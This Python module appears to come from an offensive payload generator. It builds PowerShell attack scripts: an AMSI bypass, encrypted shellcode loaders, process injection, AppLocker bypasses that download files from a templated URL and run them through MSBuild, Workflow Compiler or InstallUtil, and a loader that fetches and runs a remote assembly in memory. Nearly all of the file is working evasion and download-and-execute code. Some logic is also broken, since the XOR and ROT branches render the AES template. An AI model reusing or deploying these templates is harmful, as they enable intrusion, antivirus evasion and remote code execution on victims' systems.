import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

from .utils import *

path = os.path.dirname(__file__)

amsi_bypass = '''
Foreach($type in [Ref].Assembly.GetTypes()){if($type.Name -like "*iuti*"){Foreach($field in $type.GetFields('NonPublic,Static')){if($field.Name -like "*iinit*"){$field.SetValue(0,$true)}}}}
'''

shellcode ='''
$buf  = {{SHELLCODE}}
'''

aes = '''
$key = {{KEY}}
$iv  = {{IV}}

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV  = $iv

$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$decryptor = $aes.CreateDecryptor()

$ms = New-Object System.IO.MemoryStream
$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

$cs.Write($buf, 0, $buf.Length)
$cs.FlushFinalBlock()
$cs.Close()

$buf = $ms.ToArray()
$ms.Close()
$aes.Dispose()
'''

xor = '''
$KEY = {{KEY}}
for ($i = 0; $i -lt $buf.Length; $i++) {
    $buf[$i] = $buf[$i] -bxor $KEY
}
'''

rot = '''
$KEY = {{KEY}}
for ($i = 0; $i -lt $buf.Length; $i++) {
    $buf[$i] = [byte]( ($buf[$i] - $KEY) -band 0xFF )
}
'''

#(New-Object System.Net.WebClient).DownloadFile("{{URL}}/{{NAME}}.xml","{{PATH}}\\{{NAME}}.xml");
msbuild = '''
Invoke-WebRequest -Uri "{{URL}}/{{NAME}}.xml" -OutFile "{{PATH}}\\{{NAME}}.xml" -UseBasicParsing;
C:\\Windows\\Microsoft.Net\\Framework{{ARCH}}\\v4.0.30319\\MSBuild.exe "{{PATH}}\\{{NAME}}.xml"
'''

workflow_compiler = '''
Invoke-WebRequest -Uri "{{URL}}/{{NAME}}.xml" -OutFile "{{PATH}}\\{{NAME}}.xml" -UseBasicParsing;
Invoke-WebRequest -Uri "{{URL}}/{{NAME}}.cs" -OutFile "{{PATH}}\\{{NAME}}.cs" -UseBasicParsing;;
C:\\Windows\\Microsoft.Net\\Framework{{ARCH}}\\v4.0.30319\\Microsoft.Workflow.Compiler.exe "{{PATH}}\\{{NAME}}.xml" "{{PATH}}\\results.xml"
'''

installutil = '''
Invoke-WebRequest -Uri "{{URL}}/{{NAME}}.txt" -OutFile "{{PATH}}\\{{NAME}}.txt" -UseBasicParsing;;
C:\\Windows\\Microsoft.Net\\Framework{{ARCH}}\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U "{{PATH}}\\{{NAME}}.txt"
'''

assembly_load ='''
$data=(New-Object System.Net.WebClient).DownloadData('{{URL}}');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
[Craft.Program]::Main();
'''

def bytes_to_ps(data):
    hex_bytes = [f'0x{b:02X}' for b in data]
    return ', '.join(hex_bytes)

def av_bypass(shellcode, encrypt, key, iv, amsi, clm):
    payload = '$buf  = {{SHELLCODE}}'
    render(payload, shellcode=bytes_to_ps(shellcode))
    
    if amsi and not clm:
        payload += amsi_bypass

    if encrypt.upper() == 'AES':
        payload += render(aes, key=bytes_to_ps(key), iv=bytes_to_ps(iv))
    elif encrypt.upper() == 'XOR':
        payload += render(aes, key=hex(key))
    elif encrypt.upper() == 'ROT':
        payload += render(aes, key=hex(key))

    return payload

def shellcode_runner(shellcode, encrypt, key, iv, amsi_bypass, clm):
    with open(os.path.join(path, 'templates/ps/shellcode_runner.ps1'), 'r') as f:
        code = f.read()
    payload = av_bypass(shellcode, encrypt, key, iv, amsi_bypass, clm)
    return render(code, payload=payload)

def process_injection(shellcode, encrypt, key, iv, amsi_bypass, process, clm):
    with open(os.path.join(path, 'templates/ps/process_injection.ps1'), 'r') as f:
        code = f.read()
    payload = av_bypass(shellcode, encrypt, key, iv, amsi_bypass, clm)
    process_name = os.path.splitext(os.path.basename(process.replace('\\','/')))[0]
    return render(code, payload=payload, process=process_name)

def applocker_bypass(applocker, url, path, name, arch, amsi, clm):
    payload = ''
    if amsi and not clm:
        payload += amsi_bypass
    
    if applocker == 'msbuild':
        payload += msbuild
    elif applocker == 'workflow_compiler':
        payload += workflow_compiler
    elif applocker == 'installutil':
        payload += installutil
    return render(payload, url=url, path=path, name=name, arch=arch)

def assembly_reflection(url, amsi, clm):
    payload = ''
    if amsi and not clm:
        payload += amsi_bypass
    payload += render(assembly_load, url=url)
    return payload